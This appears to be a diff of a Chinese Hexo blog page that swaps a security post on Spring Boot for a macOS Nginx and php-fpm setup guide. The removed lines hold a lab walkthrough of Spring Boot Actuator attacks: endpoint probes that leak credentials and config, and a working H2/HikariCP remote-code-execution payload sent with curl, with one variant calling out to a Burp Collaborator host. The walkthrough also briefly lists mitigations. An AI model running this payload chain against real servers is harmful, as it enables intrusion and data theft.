@@ -2,9 +2,9 @@
 <html>
 <head>
   <meta charset="utf-8">
-  <title>Spring | Mr.Frame</title>
+  <title>Mac下搭建Nginx+php开发平台 | Mr.Frame</title>
   <meta name="keywords" content="">
-  <meta name="description" content="Spring | Mr.Frame">
+  <meta name="description" content="Mac下搭建Nginx+php开发平台 | Mr.Frame">
     <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
 <meta name="description" content="404 Not Found: 该页面无法显示很抱歉，您所访问的地址并不存在!!!">
 <meta property="og:type" content="website">
@@ -1095,9 +1095,9 @@
 </aside>
 <div id="post">
     <div class="pjax">
-        <article id="post-Spring" class="article article-type-post" itemscope itemprop="blogPost">
+        <article id="post-Mac下搭建Nginx-php开发平台" class="article article-type-post" itemscope itemprop="blogPost">
     
-        <h1 class="article-title">Spring</h1>
+        <h1 class="article-title">Mac下搭建Nginx+php开发平台</h1>
     
     <div class="article-meta">
         
@@ -1107,9 +1107,7 @@
             <i class="iconfont icon-category"></i>
             
             
-            <a  data-rel="Kali">Kali</a> > 
-            
-            <a  data-rel="Kali&lt;---&gt;Exploit">Exploit</a>
+            <a  data-rel="Tools">Tools</a>
             
         </span>
         
@@ -1117,12 +1115,12 @@
     </div>
     <div class="article-meta">
         
-            Created At : <time class="date" title='Updated At: 2021-11-15 20:55:58'>2021-11-15 20:55</time>
+            Created At : <time class="date" title='Updated At: 2022-04-07 21:01:16'>2022-04-07 21:01</time>
         
     </div>
     <div class="article-meta">
         
-        <span>Count:902</span>
+        <span>Count:288</span>
         
         
         <span id="busuanzi_container_page_pv">
@@ -1152,7 +1150,7 @@
     
     <div class="toc-ref">
     
-        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86"><span class="toc-text">信息收集</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AE%89%E5%85%A8%E6%8E%AA%E6%96%BD"><span class="toc-text">安全措施</span></a></li></ol></li></ol>
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Table-of-Contents"><span class="toc-text">Table of Contents</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E8%BD%AF%E4%BB%B6%E5%AE%89%E8%A3%85"><span class="toc-text">软件安装</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%85%8D%E7%BD%AE%E8%B7%AF%E5%BE%84"><span class="toc-text">配置路径</span></a></li></ol></li></ol>
     
 <style>
     .left-col .switch-btn,
@@ -1172,77 +1170,58 @@
 <ul>
 <li><input checked="" disabled="" type="checkbox"> </li>
 </ul>
-<p>推荐资料：</p>
-<ul>
-<li><a target="_blank" rel="noopener" href="https://github.com/LandGrey/SpringBootVulExploit">SpringBootVulExploit</a></li>
-<li><a target="_blank" rel="noopener" href="https://misakikata.github.io/2020/04/Spring-%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E%E9%9B%86%E5%90%88/">Spring 框架漏洞集合</a></li>
-<li><a target="_blank" rel="noopener" href="https://www.cnblogs.com/cwkiller/p/12829974.html">Spring Boot Actuator H2 RCE复现</a></li>
-</ul>
-<ul>
-<li><a target="_blank" rel="noopener" href="https://www.jianshu.com/p/91a5ca9b7c1c">Spring Boot Actuator(eureka xstream deserialization RCE)</a></li>
-</ul>
-<p><strong>Spring</strong> 是为解决企业应用开发的复杂性而创建的一个开源框架。<br>    主要的设计思想是有两个：</p>
-<ul>
-<li><code>控制反转IOC</code><br>IOC是一种设计思想，将原本在程序中自己手动创建对象的控制权，交由 Spring 框架来管理。</li>
-<li><code>面向方面编程AOP</code><br>利用一种称为”横切”的技术，剖解开封装的对象内部，并将那些影响了多个类的公共行为封装到一个可重用模块，并将其命名为”Aspect”，即切面。</li>
-</ul>
-<h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><pre><code class="zsh">nmap -Pn -T4  -p 8080  -sV --version-all 192.168.79.28
-Starting Nmap 7.91 ( https://nmap.org ) at 2020-12-15 17:18 CST
-Nmap scan report for 192.168.79.28
-Host is up (0.00019s latency).
-
-PORT     STATE SERVICE    VERSION
-8080/tcp open  http-proxy</code></pre>
-<p>访问不存在的页面包含以下信息证明使用了Spring Boot</p>
-<pre><code class="html">Whitelabel Error Page
-
-This application has no explicit mapping for /error, so you are seeing this as a fallback.
-Tue Dec 15 09:35:57 GMT 2020
-There was an unexpected error (type=Not Found, status=404).
-No message available</code></pre>
-<p>Spring API信息获取</p>
-<pre><code class="zsh">curl -v &#39;http://192.168.79.28:8080/trace&#39;  # 获取用户认证字段
-curl -v &#39;http://192.168.79.28:8080/env&#39;    # 服务器配置信息，包括数据库
-curl -v &#39;http://192.168.79.28:8080/health&#39;  # 泄漏git项目地址
-curl -v &#39;http://192.168.79.28:8080/heapdump&#39; # 泄漏后台用户信息
-curl -v &#39;http://192.168.79.28:8080/&#39;
-curl -v &#39;http://192.168.79.28:8080/&#39;
-curl -v &#39;http://192.168.79.28:8080/&#39;
-curl -v &#39;http://192.168.79.28:8080/&#39;
-
-## Spring Boot Actuator H2 with HikariCP远程代码执行
-
-**Actuator** 是 Spring Boot 提供的用来对应用系统进行自省和监控的功能模块，借助于 Actuator 开发者可以很方便地对应用系统某些监控指标进行查看、统计等。  
-
-Actuator 配置不当导致应用系统监控信息泄露对应用系统及其用户的危害是巨大的
-
-更多[Spring Boot Rest API](https://howtodoinjava.com/spring-boot2/rest/rest-api-example/)
-
-```zsh
- curl  &#39;http://192.168.79.28:8080/actuator&#39;  # 查看actuator下的端点actuator/env
-&#123;&quot;_links&quot;:&#123;&quot;self&quot;:&#123;&quot;href&quot;:&quot;http://192.168.79.28:8080/actuator&quot;,&quot;templated&quot;:false&#125;,&quot;env-toMatch&quot;:&#123;&quot;href&quot;:&quot;http://192.168.79.28:8080/actuator/env/&#123;toMatch&#125;&quot;,&quot;templated&quot;:true&#125;,&quot;env&quot;:&#123;&quot;href&quot;:&quot;http://192.168.79.28:8080/actuator/env&quot;,&quot;templated&quot;:false&#125;,&quot;restart&quot;:&#123;&quot;href&quot;:&quot;http://192.168.79.28:8080/actuator/restart&quot;,&quot;templated&quot;:false&#125;&#125;&#125;%</code></pre>
-<p>发送EXP</p>
-<pre><code class="json">POST /actuator/env HTTP/1.1
-
-content-type: application/json
-
-&#123;&quot;name&quot;:&quot;spring.datasource.hikari.connection-test-query&quot;,&quot;value&quot;:&quot;CREATE ALIAS EXEC AS &#39;String shellexec(String cmd) throws java.io.IOException &#123; java.util.Scanner s = new java.util.Scanner(Runtime.getRuntime().exec(cmd).getInputStream());  if (s.hasNext()) &#123;return s.next();&#125; throw new IllegalArgumentException();&#125;&#39;; CALL EXEC(&#39;/Applications/Calculator.app/Contents/MacOS/Calculator&#39;);&quot;&#125;
-
-
-POST /actuator/restart HTTP/1.1
-
-content-type: application/json
-
-&#123;&#125;
-</code></pre>
-<pre><code class="zsh">curl -X &#39;POST&#39; -H &#39;Content-Type: application/json&#39; --data-binary $&#39;&#123;\&quot;name\&quot;:\&quot;spring.datasource.hikari.connection-test-query\&quot;,\&quot;value\&quot;:\&quot;CREATE ALIAS EXEC AS CONCAT(\&#39;String shellexec(String cmd) throws java.io.IOException &#123; java.util.Scanner s = new\&#39;,\&#39; java.util.Scanner(Runtime.getRun\&#39;,\&#39;time().exec(cmd).getInputStream()); if (s.hasNext()) &#123;return s.next();&#125; throw new IllegalArgumentException(); &#125;\&#39;);CALL EXEC(\&#39;curl http://x.burpcollaborator.net\&#39;);\&quot;&#125;&#39; &#39;http://192.168.79.28:8080/actuator/env&#39;
-
-#发送exp
-curl -X &#39;POST&#39; -H &#39;Content-Type: application/json&#39; &#39;http://192.168.79.28:8080/actuator/restart&#39;   # 触发exp</code></pre>
-<h3 id="安全措施"><a href="#安全措施" class="headerlink" title="安全措施"></a>安全措施</h3><ol>
-<li>引入 security 依赖，打开安全限制并进行身份验证</li>
-<li>设置单独的 Actuator 管理端口并配置不对外网开放</li>
+<h1 id="Table-of-Contents"><a href="#Table-of-Contents" class="headerlink" title="Table of Contents"></a>Table of Contents</h1><ol>
+<li><a href="#org5a512c0">软件安装</a><ol>
+<li> <a href="#orge939893">配置路径</a></li>
 </ol>
+</li>
+</ol>
+<p><a id="org5a512c0"></a></p>
+<h1 id="软件安装"><a href="#软件安装" class="headerlink" title="软件安装"></a>软件安装</h1><ul>
+<li><p>  php-fpm : FastCGI进城管理器(mac自带)</p>
+</li>
+<li><p>nginx : 高性能的HTTP和反向代理web服务器</p>
+<pre><code>brew install nginx
+Updating Homebrew...
+==&gt; Downloading from https://pkg-containers.githubusercontent.com/ghcr1/blobs/sha256:8ba34676e573272aa1f73d4dcf6bfddbaa69746a92bf812f6760b######################################################################## 100.0%
+==&gt; Pouring nginx--1.21.1.big_sur.bottle.tar.gz
+==&gt; Caveats
+Docroot is: /usr/local/var/www
+
+The default port has been set in /usr/local/etc/nginx/nginx.conf to 8080 so that
+nginx can run without sudo.
+
+nginx will load all files in /usr/local/etc/nginx/servers/.
+
+To have launchd start nginx now and restart at login:
+  brew services start nginx
+Or, if you don&#39;t want/need a background service you can just run:
+  nginx
+==&gt; Summary
+🍺  /usr/local/Cellar/nginx/1.21.1: 25 files, 2.2MB</code></pre>
+<p>  brew services start nginx  # 开机自启nginx</p>
+</li>
+</ul>
+<p><a id="orge939893"></a></p>
+<h2 id="配置路径"><a href="#配置路径" class="headerlink" title="配置路径"></a>配置路径</h2><ul>
+<li><p>  nginx安装路径 <code>/usr/local/Cellar/nginx/1.21.1</code></p>
+</li>
+<li><p>  nginx配置文件 <code>/usr/local/etc/nginx/nginx.conf</code></p>
+</li>
+<li><p>  Docroot <code>/usr/local/var/www</code></p>
+</li>
+<li><p>php-fpm配置文件 <code>/etc/php-fpm.conf.default</code></p>
+<p>  cp /private/etc/php-fpm.conf.default /private/etc/php-fpm.conf<br>  cp /private/etc/php-fpm.d/<a target="_blank" rel="noopener" href="http://www.conf.default/">www.conf.default</a> /private/etc/php-fpm.d/<a target="_blank" rel="noopener" href="http://www.conf/">www.conf</a></p>
+</li>
+<li><p>创建error<sub>log文件</sub></p>
+<pre><code>  mkdir /usr/local/var/log/php-fpm
+  touch /usr/local/var/log/php-fpm/php-fpm.log
+
+  //修改php-fpm.conf
+  error_log = /usr/local/var/log/php-fpm/php-fpm.log</code></pre>
+</li>
+</ul>
+<p>参考：<br><a target="_blank" rel="noopener" href="https://segmentfault.com/a/1190000025138860">基于Mac自带nginx,php配置php运行环境</a></p>
 <script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kity@2.0.4/dist/kity.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kityminder-core@1.4.50/dist/kityminder.core.min.js"></script><script defer="true" type="text/javascript" src="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.js"></script><link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.css">
       
        <hr><span style="font-style: italic;color: gray;"> 转载请注明来源，欢迎对文章中的引用来源进行考证，欢迎指出任何有错误或不够清晰的表达。可以在下面评论区评论，也可以邮件至 askding@qq.com </span>
